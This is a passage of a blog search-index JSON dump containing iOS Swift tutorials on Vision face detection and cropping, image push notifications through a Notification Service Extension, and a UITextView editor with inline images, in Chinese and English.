+0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Exploring Vision — Automatic Face Detection and Cropping for App Profile Pictures (S...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Exploring Vision — Automatic Face Detection and Cropping for App Profile Pictures (Swift)Practical Applications of Vision[2024/08/13 Update] Please refer to the new article and API: “iOS Vision framework x WWDC 24 Discover Swift enhancements in the Vision framework Session”Without further ado, here’s a before-and-after image:Before vs After Optimization — Marriage AppRecently, with the release of iOS 12, I noticed the newly available CoreML machine learning framework. I found it quite interesting and started to think about how I could apply it to our current products. CoreML introductory article has been published: Using Machine Learning to Automatically Predict Article Categories, Including Self-Training the ModelCoreML provides interfaces for training and integrating machine learning models for text and images into apps. My initial idea was to use CoreML for face detection to address the issue of profile pictures being cropped awkwardly in the app, as shown in the left image above. When a face appears near the edges, it can easily get cut off due to scaling and cropping.After some research, I realized that I was a bit behind the curve; this functionality was already introduced in iOS 11 with the “Vision” framework, which supports text detection, face detection, image matching, QR code detection, object tracking, and more.The face detection feature is what we are using here, and after optimization, it looks like the right image above; it detects faces and crops the image accordingly.Let’s Get Started:First, we’ll implement a feature to mark the position of detected faces and get acquainted with how to use Vision.Demo AppThe completed image is shown above, which can mark the positions of faces in the photo.P.S. It can only mark “faces”; it doesn’t include the entire head or hair 😅This part of the code is mainly divided into two sections. The first part addresses the issue of leaving white space when scaling the original image to fit into an ImageView. In simple terms, we want the size of the Image to match the size of the ImageView. If we directly insert the image, it can lead to misalignment as shown below:You might think about changing the ContentMode to fill, fit, or redraw, but that would distort the image or cut it off.let ratio = UIScreen.main.bounds.size.width// This is because I set the left and right alignment of the UIImageView to 0, with an aspect ratio of 1:1.let sourceImage = UIImage(named: \"Demo2\")?.kf.resize(to: CGSize(width: ratio, height: CGFloat.leastNonzeroMagnitude), for: .aspectFill)// Using KingFisher's image resizing feature, with width as the base and height flexible.imageView.contentMode = .redraw// Set contentMode to redraw to fill the space.imageView.image = sourceImage// Assign the image.imageViewConstraints.constant = (ratio - (sourceImage?.size.height ?? 0))imageView.layoutIfNeeded()imageView.sizeToFit()// This part modifies the imageView's constraints; for details, see the complete example at the end.This is how we handle the image.Cropping is assisted by Kingfisher, but you can replace it with other libraries or custom methods.The second part focuses on the main code for face detection:if #available(iOS 11.0, *) { // Supported only in iOS 11 and later let completionHandle: VNRequestCompletionHandler = { request, error in if let faceObservations = request.results as? [VNFaceObservation] { // Detected faces DispatchQueue.main.async { // Update UI on the main thread let size = self.imageView.frame.size faceObservations.forEach({ (faceObservation) in // Coordinate system transformation let translate = CGAffineTransform.identity.scaledBy(x: size.width, y: size.height) let transform = CGAffineTransform(scaleX: 1, y: -1).translatedBy(x: 0, y: -size.height) let transRect = faceObservation.boundingBox.applying(translate).applying(transform) let markerView = UIView(frame: transRect) markerView.backgroundColor = UIColor(red: 0/255, green: 255/255, blue: 0/255, alpha: 0.3) self.imageView.addSubview(markerView) }) } } else { print(\"No faces detected\") } } // Face detection request let baseRequest = VNDetectFaceRectanglesRequest(completionHandler: completionHandle) let faceHandle = VNImageRequestHandler(ciImage: ciImage, options: [:]) DispatchQueue.global().async { // Face detection takes time, so we run it in a background thread to avoid freezing the UI do { try faceHandle.perform([baseRequest]) } catch { print(\"Error: \\(error)\") } } } else { print(\"Not supported\")}The key point to note is the coordinate system transformation; the results from detection are in the original image’s coordinates. We need to convert them to the actual coordinates of the enclosing ImageView to use them correctly.Now, let’s move on to the main event of the day — cropping the profile picture based on the detected face position.let ratio = UIScreen.main.bounds.size.width// This is because I set the left and right alignment of the UIImageView to 0, with an aspect ratio of 1:1; for details, see the complete example at the end.let sourceImage = UIImage(named: \"Demo\")imageView.contentMode = .scaleAspectFill// Use scaleAspectFill mode to fill the space.imageView.image = sourceImage// Directly assign the original image; we will manipulate it later.if let image = sourceImage, #available(iOS 11.0, *), let ciImage = CIImage(image: image) { let completionHandle: VNRequestCompletionHandler = { request, error in if request.results?.count == 1, let faceObservation = request.results?.first as? VNFaceObservation { // One face detected let size = CGSize(width: ratio, height: ratio) let translate = CGAffineTransform.identity.scaledBy(x: size.width, y: size.height) let transform = CGAffineTransform(scaleX: 1, y: -1).translatedBy(x: 0, y: -size.height) let finalRect = faceObservation.boundingBox.applying(translate).applying(transform) let center = CGPoint(x: (finalRect.origin.x + finalRect.width / 2 - size.width / 2), y: (finalRect.origin.y + finalRect.height / 2 - size.height / 2)) // Calculate the center point of the face's bounding box let newImage = image.kf.resize(to: size, for: .aspectFill).kf.crop(to: size, anchorOn: center) // Crop the image based on the center point DispatchQueue.main.async { // Update UI on the main thread self.imageView.image = newImage } } else { print(\"Detected multiple faces or no faces\") } } let baseRequest = VNDetectFaceRectanglesRequest(completionHandler: completionHandle) let faceHandle = VNImageRequestHandler(ciImage: ciImage, options: [:]) DispatchQueue.global().async { do { try faceHandle.perform([baseRequest]) } catch { print(\"Error: \\(error)\") } }} else { print(\"Not supported\")}The logic is similar to marking the face positions, but the difference for the profile picture is that it has a fixed size (e.g., 300x300), so we skip the initial part about fitting the Image to the ImageView.Another difference is that we need to calculate the center point of the face’s bounding box and use this point for cropping the image.Red dot indicates the center point of the face’s bounding box.Final Result:The moment before cropping shows the original image position.Complete App Example:The code has been uploaded to GitHub: Click here.If you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,364 Total Views Last Statistics Date: 2025-08-15 | 1,324 Views on Medium." }, { "title": "iOS ≥ 10 Notification Service Extension 應用 (Swift)", "url": "/posts/zrealm-dev/ios-10-notification-service-extension-%E6%87%89%E7%94%A8-swift-cb6eba52a342/", "categories": "ZRealm Dev.", "tags": "swift, push-notification, notificationservice, ios, ios-app-development", "date": "2018-10-15 23:44:01 +0800", "snippet": "iOS ≥ 10 Notification Service Extension 應用 (Swift)圖片推播、推播顯示統計、推播顯示前處理關於基礎的推播建置、推播原理；網路資料很多，這邊就不再論述，本篇主要重點在如何讓APP支援圖片推播及運用新特性達成更精準的推播顯示統計．如上圖所示，Notification Service Extension讓你在APP收到推播後能針對推播做預處理，然後才...", "content": "iOS ≥ 10 Notification Service Extension 應用 (Swift)圖片推播、推播顯示統計、推播顯示前處理關於基礎的推播建置、推播原理；網路資料很多，這邊就不再論述，本篇主要重點在如何讓APP支援圖片推播及運用新特性達成更精準的推播顯示統計．如上圖所示，Notification Service Extension讓你在APP收到推播後能針對推播做預處理，然後才顯示推播內容官方文件寫到，我們針對推播進來的內容做處理時，處理時限大約30秒鐘，如果超過30秒還沒CallBack，推播就會繼續執行，出現在使用者的手機．支援度iOS ≥ 10.030秒可以幹嘛？ (目標1) 從推播內容的圖片連結欄位下載圖片回來，並附加到推播內容上🏆 (目標2) 統計推播有無顯示🏆 推播內容修改、重組內容 推播內容加解密(解密)顯示 決定推播要不要顯示？ =&gt;&gt; 答案：不行首先，後端推播程式的 Payload 部分後端在推播時的結構要多加上一行 “mutable-content\":1 系統收到推播才會執行Notification Service Extension{ \"aps\": { \"alert\": { \"title\": \"新文章推薦給您\", \"body\": \"立即查看\" }, \"mutable-content\":1, \"sound\": \"default\", \"badge\": 0 }}And… 第一步，為專案新建一個TargetStep 1. Xcode -&gt; File -&gt; New -&gt; TargetStep 2. iOS -&gt; Notification Service Extension -&gt; NextStep 3. 輸入Product Name -&gt; FinishStep 4. 點選 Activate第二步，撰寫推播內容處理程式找到Product Name/NotificationService.swift檔import UserNotificationsclass NotificationService: UNNotificationServiceExtension { var contentHandler: ((UNNotificationContent) -&gt; Void)? var bestAttemptContent: UNMutableNotificationContent? override func didReceive(_ request: UNNotificationRequest, withContentHandler contentHandler: @escaping (UNNotificationContent) -&gt; Void) { self.contentHandler = contentHandler bestAttemptContent = (request.content.mutableCopy() as? UNMutableNotificationContent) if let bestAttemptContent = bestAttemptContent { // Modify the notification content here... // 推播內容在這處理，Load 圖片回來 bestAttemptContent.title = \"\\(bestAttemptContent.title) [modified]\" contentHandler(bestAttemptContent) } } override func serviceExtensionTimeWillExpire() { // Called just before the extension will be terminated by the system. // Use this as an opportunity to deliver your \"best attempt\" at modified content, otherwise the original push payload will be used. // 要逾時了，不管圖片 只改標題內容就好 if let contentHandler = contentHandler, let bestAttemptContent = bestAttemptContent { contentHandler(bestAttemptContent) } }}如上程式碼，NotificationService有兩個接口；第一個是 didReceive 當有推播進來時會觸發這個function，其中當處理完畢後需要呼叫 contentHandler(bestAttemptContent) 這個CallBack Method告知系統如果時間過久都沒呼叫CallBack Method，就會觸發第二個 function serviceExtensionTimeWillExpire() 已逾時，基本上已回天乏術，只能做一些收尾的動作(例如：單純改改標題、內容，不Load網路資料了)實戰範例這裡假設我們的 Payload 如下{ \"aps\": { \"alert\": { \"push_id\":\"2018001\", \"title\": \"新文章推薦給您\", \"body\": \"立即查看\", \"image\": \"https://d2uju15hmm6f78.cloudfront.net/image/2016/12/04/3113/2018/09/28/trim_153813426461775700_450x300.jpg\" }, \"mutable-content\":1, \"sound\": \"default\", \"badge\": 0 }}「push_id」跟「image」都是我自訂的欄位，push_id用於辨識推播方便我們傳回伺服器做統計；image 則是推播要附加的圖片內容之圖片網址override func didReceive(_ request: UNNotificationRequest, withContentHandler contentHandler: @escaping (UNNotificationContent) -&gt; Void) { self.contentHandler = contentHandler bestAttemptContent = (request.content.mutableCopy() as? UNMutableNotificationContent) if let bestAttemptContent = bestAttemptContent { guard let info = request.content.userInfo[\"aps\"] as? NSDictionary,let alert = info[\"alert\"] as? Dictionary&lt;String,String&gt; else { contentHandler(bestAttemptContent) return //推播內容格式不如預期，不處理 } //目標2: //回傳Server，告知推播有顯示 if let push_id = alert[\"push_id\"],let url = URL(string: \"顯示統計API網址\") { var request = URLRequest(url: url, cachePolicy: .reloadIgnoringLocalCacheData, timeoutInterval: 30) request.httpMethod = \"POST\" request.addValue(UserAgent, forHTTPHeaderField: \"User-Agent\") var httpBody = \"push_id=\\(push_id)\" request.addValue(\"application/x-www-form-urlencoded\", forHTTPHeaderField: \"Content-Type\") request.httpBody = httpBody.data(using: .utf8) let task = URLSession.shared.dataTask(with: request) { (data, response, error) in } DispatchQueue.global().async { task.resume() //異步處理，不管他 } } //目標1: guard let imageURLString = alert[\"image\"],let imageURL = URL(string: imageURLString) else { contentHandler(bestAttemptContent) return //若無附圖片，則不用特別處理 } let dataTask = URLSession.shared.dataTask(with: imageURL) { (data, response, error) in guard let fileURL = NSURL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent(imageURL.lastPathComponent) else { contentHandler(bestAttemptContent) return } guard (try? data?.write(to: fileURL)) != nil else { contentHandler(bestAttemptContent) return } guard let attachment = try? UNNotificationAttachment(identifier: \"image\", url: fileURL, options: nil) else { contentHandler(bestAttemptContent) return } //以上為讀取圖片連結並下載到手機並放入建立UNNotificationAttachment bestAttemptContent.categoryIdentifier = \"image\" bestAttemptContent.attachments = [attachment] //為推播添加附件圖片 bestAttemptContent.body = (bestAttemptContent.body == \"\") ? (\"立即查看\") : (bestAttemptContent.body) //如果body為空，則用預設內容\"立即查看\" contentHandler(bestAttemptContent) } dataTask.resume() }}serviceExtensionTimeWillExpire 的部分我沒特別處理什麼，就不貼了；關鍵還是上述 didReceive 的程式碼可以看到當接受到有推播通知時，我們先Call Api告訴後端有收到並將顯示推播了，方便我們後台做推播統計；然後若有附加圖片再對圖片進行處理．In-App狀態時：ㄧ樣會觸發Notification Service Extension didReceive 再觸發AppDelegate的 func application( _ application: UIApplication, didReceiveRemoteNotification userInfo: [AnyHashable : Any ], fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -&gt; Void) 方法附註：關於圖片推播的部分你還可以….使用 Notification Content Extension 自訂推播按壓時要顯示的UIView(可以自己刻)，還有按壓的動作可參考這篇： iOS10推送通知进阶(Notification Extension）iOS 12之後支援更多動作處理： iOS 12 新通知功能：添加互動性 在通知中實作複雜功能Notification Content Extension的部分，我只拉了一個能展示圖片推播的UIView 並沒有做太多琢磨：結婚吧APP有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 5,519 Total Views Last Statistics Date: 2025-08-15 | 5,358 Views on Medium." }, { "title": "iOS UITextView 文繞圖編輯器 (Swift)", "url": "/posts/zrealm-dev/ios-uitextview-%E6%96%87%E7%B9%9E%E5%9C%96%E7%B7%A8%E8%BC%AF%E5%99%A8-swift-e37d66ea1146/", "categories": "ZRealm Dev.", "tags": "swift, ios, mobile-app-development, uitextview, ios-app-development", "date": "2018-10-14 02:07:49 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS UITextView 文繞圖編輯器 (Swift)實戰路線目標功能：APP上有一個讓使用者能發表文章的討論區功能，發表文章功能介面需要能輸入文字、插入多張圖片、支援文繞圖穿插．功能需求： 能輸入多行文字 能在行中穿...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.iOS UITextView 文繞圖編輯器 (Swift)實戰路線目標功能：APP上有一個讓使用者能發表文章的討論區功能，發表文章功能介面需要能輸入文字、插入多張圖片、支援文繞圖穿插．功能需求： 能輸入多行文字 能在行中穿插圖片 能上傳多張圖片 能隨意移除插入的圖片 圖片上傳效果/失敗處理 能將輸入內容轉譯成可傳遞文本 EX: BBCODE先上個成品效果圖：結婚吧APP開始：第一章什麼？你說第一章？不就用UITextView就能做到編輯器功能，哪來還需要分到「章節」；是的，我一開始的反應也是如此，直到我開始做才發現事情沒有那麼簡單，其中苦惱了我兩個星期、翻片國內外各種資料最後才找到解法，實作的心路歷程就讓我娓娓道來….如果想直接知道最終解法，請直接跳到最後一章(往下滾滾滾滾滾)．一開始文字編輯器理所當然是使用UITextView元件，看了一下文件UITextView attributedText 自帶 NSTextAttachment物件 可以附加圖片實做出文繞圖效果，程式碼也很簡單：let imageAttachment = NSTextAttachment()imageAttachment.image = UIImage(named: \"example\")self.contentTextView.attributedText = NSAttributedString(attachment: imageAttachment)當初天真的我還很開心想說蠻簡單的啊、好方便；問題現在才正要開始： 圖片要能是從本地選擇&amp;上傳：這好解決，圖片選擇器我使用 TLPhotoPicker 這個套件(支援多圖選擇/客製化設定/切換相機拍照/Live Photos)，具體作法就是 TLPhotoPicker選完圖片Callback後將PHAsset轉成UIImage塞進去imageAttachment.image並預先在背景上傳圖片至Server。 圖片上傳要有效果並能添加互動操作(點擊查看原圖/點擊X能刪除)：沒做出來，找不到NSTextAttachment有什麼辦法能做到這項需求，不過這功能沒有還行反正還是能刪除(在圖片後按鍵盤上的「Back」鍵能刪除圖片)，我們繼續… 原始圖檔案過大，上傳慢、插入慢、吃效能：插入及上傳前先Resize過，用 Kingfisher 的resizeTo 圖片插入在游標停留的位置：這裡就要將原本的Code改成如下let range = self.contentTextView.selectedRange.location ?? NSRange(location: 0, length: 0)let combination = NSMutableAttributedString(attributedString: self.contentTextView.attributedText) //取得當前內容combination.insert(NSAttributedString(attachment: imageAttachment), at: range)self.contentTextView.attributedText = combination //回寫回去 圖片上傳失敗處理：這裡要說一下，我實際另外寫了一個Class 擴充原始的 NSTextAttachment 目的就是要多塞個屬性存識別用的值class UploadImageNSTextAttachment:NSTextAttachment { var uuid:String?}上傳圖片時改成：let id = UUID().uuidStringlet attachment = UploadImageNSTextAttachment()attachment.uuid = id有辦法辨識NSTextAttachment的對應之後，我們就能針對上傳失敗的圖片，去attributedTextd裡做NSTextAttachment搜索，找到他並取代成錯誤提示圖或直接移除if let content = self.contentTextView.attributedText { content.enumerateAttributes(in: NSMakeRange(0, content.length), options: NSAttributedString.EnumerationOptions(rawValue: 0)) { (object, range, stop) in if object.keys.contains(NSAttributedStringKey.attachment) { if let attachment = object[NSAttributedStringKey.attachment] as? UploadImageNSTextAttachment,attachment.uuid == \"目標ID\" { attachment.bounds = CGRect(x: 0, y: 0, width: 30, height: 30) attachment.image = UIImage(named: \"IconError\") let combination = NSMutableAttributedString(attributedString: content) combination.replaceCharacters(in: range, with: NSAttributedString(attachment: attachment)) //如要直接移除可用deleteCharacters(in: range) self.contentTextView.attributedText = combination } } }}克服上述問題後，程式碼大約會長成這樣：class UploadImageNSTextAttachment:NSTextAttachment { var uuid:String?}func dismissPhotoPicker(withTLPHAssets: [TLPHAsset]) { //TLPhotoPicker 圖片選擇器的Callback let range = self.contentTextView.selectedRange.location ?? NSRange(location: 0, length: 0) //取得游標停留位置，無則從頭 guard withTLPHAssets.count &gt; 0 else { return } DispatchQueue.global().async { in //在背景處理 let orderWithTLPHAssets = withTLPHAssets.sorted(by: { $0.selectedOrder &gt; $1.selectedOrder }) orderWithTLPHAssets.forEach { (obj) in if var image = obj.fullResolutionImage { let id = UUID().uuidString var maxWidth:CGFloat = 1500 var size = image.size if size.width &gt; maxWidth { size.width = maxWidth size.height = (maxWidth/image.size.width) * size.height } image = image.resizeTo(scaledToSize: size) //縮圖 let attachment = UploadImageNSTextAttachment() attachment.bounds = CGRect(x: 0, y: 0, width: size.width, height: size.height) attachment.uuid = id DispatchQueue.main.async { //切回主執行緒更新UI插入圖片 let combination = NSMutableAttributedString(attributedString: self.contentTextView.attributedText) attachments.forEach({ (attachment) in combination.insert(NSAttributedString(string: \"\\n\"), at: range) combination.insert(NSAttributedString(attachment: attachment), at: range) combination.insert(NSAttributedString(string: \"\\n\"), at: range) }) self.contentTextView.attributedText = combination } //上傳圖片至Server //Alamofire post or.... //POST image //if failed { if let content = self.contentTextView.attributedText { content.enumerateAttributes(in: NSMakeRange(0, content.length), options: NSAttributedString.EnumerationOptions(rawValue: 0)) { (object, range, stop) in if object.keys.contains(NSAttributedStringKey.attachment) { if let attachment = object[NSAttributedStringKey.attachment] as? UploadImageNSTextAttachment,attachment.uuid == obj.key { //REPLACE: attachment.bounds = CGRect(x: 0, y: 0, width: 30, height: 30) attachment.image = //ERROR Image let combination = NSMutableAttributedString(attributedString: content) combination.replaceCharacters(in: range, with: NSAttributedString(attachment: attachment)) //OR DELETE: //combination.deleteCharacters(in: range) self.contentTextView.attributedText = combination } } } } //} // } } }}到此差不多問題都解決了，那是什麼苦惱了我兩週呢？答：「記憶體」問題iPhone 6頂不住啊!以上做法插入超過5張圖片，UITextView就會開始卡頓；到一個程度就會因為記憶體負荷不了APP直接閃退p.s 試過各種壓縮/其他儲存方式，結果依然推測原因是，UITextView沒有針對圖片的NSTextAttachment做Reuse，你所插入的所有圖片都Load在記憶體之中不會釋放；所以除非是拿來穿插表情符號那種小圖😅，不然根本不能拿來做文繞圖第二章發現記憶體這個「硬傷」後，繼續在網路上搜索解決方案，得到以下其他做法： 用WebView嵌套HTML檔案( &lt;div contentEditable=”true”&gt;&lt;/div&gt;)並用JS跟WebView做交互處理 用UITableView结合UITextView，能Reuse 基於TextKit自行擴充UITextView🏆第一項用WebView嵌套HTML檔案的做法；考量到效能跟使用者體驗，所以不考慮，有興趣的朋友可以在Github搜尋相關的解決方案(EX: RichTextDemo )第二項用UITableView结合UITextView我實作了大約7成出來，具體大約是每一行都是一個Cell，Cell有兩種，一種是UITextView另一種是UIImageView，圖片一行文字一行；內容必須用陣列去儲存，避免Reuse過程消失能優秀的Reuse解決記憶體問題，但做到後面還是放棄了，在 控制行尾按Return要能新建一行並跳到該行 和 控制行頭按Back鍵要能跳到上一行(若當前為空行要能刪除該行) 這兩個部分上吃足苦頭，非常難控制有興趣的朋友可參考： MMRichTextEdit 」最終章走到這裡已經耗費了許多時間，開發時程嚴重拖延；目前最終解法就是用TextKit這裡附上兩篇找到的文章給有興趣研究的朋友： TextKit 探究 从UITextView看文字绘制优化但有一定的學習門檻，對我這個菜鳥來說太難了，再說時間也已不夠，只能漫無目的在Github尋找他山之石借借用用最終找到 XLYTextKitExtension 這個項目，可以直接引入Code使用✔ 讓 NSTextAttachment 支援自訂義UIView 要加什麼交互操作都可以✔ NSTextAttachment 可以Reuse 不會撐爆記憶體具體實作方式跟 第一章 差不多，就只差在原本是用NSTextAttachment而現在改用XLYTextAttachment針對要使用的UITextView:contentTextView.setUseXLYLayoutManager()Tip 1:插入NSTextAttachment的地方改為let combine = NSMutableAttributedString(attributedString: NSAttributedString(string: \"\"))let imageView = UIView() // your custom viewlet imageAttachment = XLYTextAttachment { () -&gt; UIView in return imageView}imageAttachment.id = idimageAttachment.bounds = CGRect(x: 0, y: 0, width: size.width, height: size.height)combine.append(NSAttributedString(attachment: imageAttachment))self.contentTextView.textStorage.insert(combine, at: range)Tip 2:NSTextAttachment搜索改為self.contentTextView.textStorage.enumerateAttribute(NSAttributedStringKey.attachment, in: NSRange(location: 0, length: self.contentTextView.textStorage.length), options: []) { (value, range, stop) in if let attachment = value as? XLYTextAttachment { //attachment.id }}Tip 3:刪除NSTextAttachment項目改為self.contentTextView.textStorage.deleteCharacters(in: range)Tip 4:取得當前內容長度self.contentTextView.textStorage.lengthTip 5:刷新Attachment的Bounds大小主因是為了使用者體驗；插入圖片時我會先塞一張loading圖，插入的圖片在背景壓縮後才會替換上去，要去更新TextAttachment的Bounds成Resize後大小self.contentTextView.textStorage.addAttributes([:], range: range)(新增空屬性，觸發刷新)Tip 6: 將輸入內容轉譯成可傳遞文本運用Tip 2搜索全部輸入內容並將找到的Attachment取出ID組合成類似[ [ID] ]格式傳遞Tip 7: 內容取代self.contentTextView.textStorage.replaceCharacters(in: range,with: NSAttributedString(attachment: newImageAttachment))Tip 8: 正規表示法匹配內容所在Rangelet pattern = \"(\\\\[\\\\[image_id=){1}([0-9]+){1}(\\\\]\\\\]){1}\"let textStorage = self.contentTextView.textStorageif let regex = try? NSRegularExpression(pattern: pattern, options: .caseInsensitive) { while true { let range = NSRange(location: 0, length: textStorage.length) if let match = regex.matches(in: textStorage.string, options: .withTransparentBounds, range: range).first { let matchString = textStorage.attributedSubstring(from: match.range) //FINDED! } else { break } }}注意：如果你要搜尋＆取代項目，需要使用While迴圈，不然當有多個搜尋結果時，找到第一個並取代後，後面的搜尋結果的Range就會錯誤導致閃退．結語目前使用此方法完成成品並上線了，還沒遇到有什麼問題；有時間我再來好好探究一下其中的原理吧！這篇比較不是教學文章，而是個人解題心得分享；如果您也在實作類似功能，希望有幫助到你，有任何問題及指教歡迎與我聯絡． Medium的正式第一篇延伸閱讀 ZMarkupParser HTML String 轉換 NSAttributedString 工具 手工打造 HTML 解析器的那些事有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,090 Total Views Last Statistics Date: 2025-08-15 | 1,003 Views on Medium." }, { "title": "iOS UITextView Image Wrapping Editor (Swift)", "url": "/posts/zrealm-dev/en/ios-uitextview-image-wrapping-editor-swift-e37d66ea1146/", "categories": "ZRealm Dev.", "tags": "swift, ios, mobile-app-development, uitextview, ios-app-development", "date": "2018-10-14 02:07:49 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版iOS UITextView Image Wrapping Editor (Swift)Practical ApproachTarget Features:The ap...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版iOS UITextView Image Wrapping Editor (Swift)Practical ApproachTarget Features:The app includes a discussion forum where users can publish articles. The article publishing interface needs to support text input, the insertion of multiple images, and image wrapping within the text.Functional Requirements: Support for multi-line text input Ability to insert images inline Support for uploading multiple images Option to easily remove inserted images Handling of image upload success/failure Ability to convert input content into a transmittable format, e.g., BBCodeHere’s a preview of the final product:(/assets/e37d66ea1146/1*Sh0XaryqYnqVGV0wJ_dDHA.gif)Wedding AppGetting Started:Chapter OneWhat? You say Chapter One? Isn’t it just a matter of using UITextView to create an editor? Why do we need to divide it into “chapters”? Yes, that was my initial reaction too, until I started working on it and realized things were not that simple. I struggled for two weeks, scouring various resources both domestically and internationally before finally finding a solution. Let me share my journey…If you want to know the final solution directly, feel free to skip to the last chapter (scroll down, down, down).In the BeginningNaturally, I started with the UITextView component for the text editor. I noticed that the attributedText property of UITextView supports NSTextAttachment, which allows for image attachments to create the image wrapping effect. The code is quite simple:let imageAttachment = NSTextAttachment()imageAttachment.image = UIImage(named: \"example\")self.contentTextView.attributedText = NSAttributedString(attachment: imageAttachment)At first, I was quite pleased, thinking it was simple and convenient. But the real challenges were just beginning: Images need to be selectable from local storage and uploaded: This was straightforward. I used the TLPhotoPicker library (which supports multi-image selection, customization, camera switching, and Live Photos). The approach was to convert the selected PHAsset into a UIImage, assign it to imageAttachment.image, and upload the image to the server in the background. Image upload should provide feedback and allow for interactive actions (click to view the original image, click X to delete): I couldn’t implement this feature as I couldn’t find a way to achieve it with NSTextAttachment. However, it was still possible to delete images (by pressing the “Back” key on the keyboard after the image), so we moved on… Original image files were too large, causing slow uploads, slow insertions, and performance issues: I resized images before insertion and upload using Kingfisher’s resizeTo. Images should be inserted at the cursor’s current position: This required modifying the original code as follows:let range = self.contentTextView.selectedRange.location ?? NSRange(location: 0, length: 0)let combination = NSMutableAttributedString(attributedString: self.contentTextView.attributedText) // Get current contentcombination.insert(NSAttributedString(attachment: imageAttachment), at: range)self.contentTextView.attributedText = combination // Write back Handling image upload failures: I created a separate class to extend the original NSTextAttachment to add a property for storing an identifier.class UploadImageNSTextAttachment: NSTextAttachment { var uuid: String?}When uploading an image, I modified it to:let id = UUID().uuidStringlet attachment = UploadImageNSTextAttachment()attachment.uuid = idWith the ability to identify the corresponding NSTextAttachment, we could search through attributedText for attachments that failed to upload and replace them with an error image or remove them entirely:if let content = self.contentTextView.attributedText { content.enumerateAttributes(in: NSMakeRange(0, content.length), options: []) { (object, range, stop) in if object.keys.contains(NSAttributedString.Key.attachment) { if let attachment = object[NSAttributedString.Key.attachment] as? UploadImageNSTextAttachment, attachment.uuid == \"targetID\" { attachment.bounds = CGRect(x: 0, y: 0, width: 30, height: 30) attachment.image = UIImage(named: \"IconError\") let combination = NSMutableAttributedString(attributedString: content) combination.replaceCharacters(in: range, with: NSAttributedString(attachment: attachment)) // To remove directly, use deleteCharacters(in: range) self.contentTextView.attributedText = combination } } }}After overcoming the above issues, the code roughly looked like this:class UploadImageNSTextAttachment: NSTextAttachment { var uuid: String?}func dismissPhotoPicker(withTLPHAssets: [TLPHAsset]) { // TLPhotoPicker image selection callback let range = self.contentTextView.selectedRange.location ?? NSRange(location: 0, length: 0) // Get cursor position, or start from the beginning guard withTLPHAssets.count &gt; 0 else { return } DispatchQueue.global().async { // Process in the background let orderWithTLPHAssets = withTLPHAssets.sorted(by: { $0.selectedOrder &gt; $1.selectedOrder }) orderWithTLPHAssets.forEach { (obj) in if var image = obj.fullResolutionImage { let id = UUID().uuidString var maxWidth: CGFloat = 1500 var size = image.size if size.width &gt; maxWidth { size.width = maxWidth size.height = (maxWidth / image.size.width) * size.height } image = image.resizeTo(scaledToSize: size) // Resize image let attachment = UploadImageNSTextAttachment() attachment.bounds = CGRect(x: 0, y: 0, width: size.width, height: size.height) attachment.uuid = id DispatchQueue.main.async { // Switch back to the main thread to update UI and insert image let combination = NSMutableAttributedString(attributedString: self.contentTextView.attributedText) attachments.forEach({ (attachment) in combination.insert(NSAttributedString(string: \"\\n\"), at: range) combination.insert(NSAttributedString(attachment: attachment), at: range) combination.insert(NSAttributedString(string: \"\\n\"), at: range) }) self.contentTextView.attributedText = combination } // Upload image to server // Alamofire post or.... // POST image // if failed { if let content = self.contentTextView.attributedText { content.enumerateAttributes(in: NSMakeRange(0, content.length), options: []) { (object, range, stop) in if object.keys.contains(NSAttributedString.Key.attachment) { if let attachment = object[NSAttributedString.Key.attachment] as? UploadImageNSTextAttachment, attachment.uuid == obj.key { // REPLACE: attachment.bounds = CGRect(x: 0, y: 0, width: 30, height: 30) attachment.image = // ERROR Image let combination = NSMutableAttributedString(attributedString: content) combination.replaceCharacters(in: range, with: NSAttributedString(attachment: attachment)) // OR DELETE: // combination.deleteCharacters(in: range) self.contentTextView.attributedText = combination } } } } //} // } } }}At this point, most issues were resolved, but what had troubled me for two weeks?The answer: “Memory” issues.iPhone 6 can’t handle it!With the above approach, inserting more than five images would cause UITextView to lag; eventually, the app would crash due to memory overload.P.S. I tried various compression and storage methods, but the results were still the same.I suspect the reason is that UITextView does not reuse NSTextAttachment for images; all inserted images are loaded into memory and not released. Therefore, unless you’re inserting small images like emojis 😅, it’s not feasible to use it for image wrapping.Chapter TwoAfter discovering the “hard limit” of memory, I continued searching online for solutions and found the following alternatives: Use a WebView to embed an HTML file (&lt;div contentEditable=\"true\"&gt;&lt;/div&gt;) and handle interactions with JavaScript. Combine UITableView with UITextView to enable reuse. Extend UITextView based on TextKit 🏆.The first option of embedding an HTML file in a WebView was not considered due to performance and user experience concerns. Interested readers can search GitHub for related solutions (e.g., RichTextDemo).The second option of combining UITableView with UITextView:I implemented about 70% of this approach, where each line is a cell, with two types of cells: one for UITextView and one for UIImageView, alternating between images and text. The content must be stored in an array to avoid loss during reuse.While this approach effectively solved the memory issue through reuse, I ultimately abandoned it due to difficulties in controlling two features: pressing Return at the end of a line to create a new line and jump to that line and pressing Back at the beginning of a line to jump to the previous line (if the current line is empty, it should delete that line). These aspects proved to be quite challenging.Interested readers can refer to: MMRichTextEdit.Final ChapterHaving spent a significant amount of time on this, the development timeline was severely delayed. The final solution I arrived at was to use TextKit.Here are two articles I found for those interested in further research: Exploring TextKit Optimizing Text Rendering in UITextView.However, there is a certain learning curve, and for a beginner like me, it was too 